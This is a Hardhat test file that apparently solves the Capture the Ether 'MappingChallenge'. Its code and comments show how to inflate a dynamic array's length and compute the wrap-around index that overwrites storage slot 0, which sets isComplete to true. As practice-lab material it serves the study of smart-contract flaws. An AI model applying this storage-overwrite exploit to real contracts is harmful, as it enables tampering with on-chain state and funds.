const { assert } = require("chai");
const { deployContract } = require("ethereum-waffle");
const { BigNumber } = require("ethers");
const { ethers, getNamedAccounts } = require("hardhat");

describe("10-MappingChallenge", function () {
    let targetContract, forceFundsContract, player;
    beforeEach(async function () {
        //make a snapshot by calling fixture
        await deployments.fixture("10");
        deployer = (await getNamedAccounts()).deployer;
        targetContract = await ethers.getContract("MappingChallenge", deployer);
    });
    /**Credit to https://github.com/kyrers/CTE-Solutions/blob/main/scripts/math/mapping.js for
     * helping me to understand why the key at which the array overlaps back to overwrite slot 0 is (2**256)-keccak256(0x1)
     * slot 0 -> isComplete
     *  slot 1 -> map.length
     * ......
     *  slot[keccka256(1)] -> map[0]
     *  slot[keccka256(1) + 1] -> map[1]
     *  slot[keccka256(1) + 2] -> map[2]
     * ......
     *
     * Note that the array items wrap around after they reached the max storage slot of 2^256
     * We need to find the
     * slot[keccka256(1) + x] -> map[x] for which slot[keccka256(1) + x] ==  slot 0
     * we know there are 2^256 slots so
     * (keccka256(1) + x) mod 2^256 = 0 => x = 2^256 - keccka256(1)
     */
    describe("set, isComplete", async function () {
        it("set map.length to max value, find array index required to write to slot 0, set isComplete to true", async function () {
            /* set the map.length to max value:
             * -> max values: 2^256 - 1;
             * -> length is increased by 1 inside if statement
             * => substract 2 */
            await targetContract.set(BigNumber.from("2").pow(256).sub(2), 2);
            const arrayStartAddressData = ethers.utils.keccak256(
                ethers.utils.hexZeroPad("0x1", 32)
            );
            console.log("arrayStartAddressData is: ", arrayStartAddressData);
            //find the array index required to write in slot 0
            const arrayIndexSlotZero = BigNumber.from(2).pow(256).sub(arrayStartAddressData);
            await targetContract.set(arrayIndexSlotZero, 1);

            const isComplete = await targetContract.isComplete();
            assert.equal(isComplete, true);
        });
    });
});
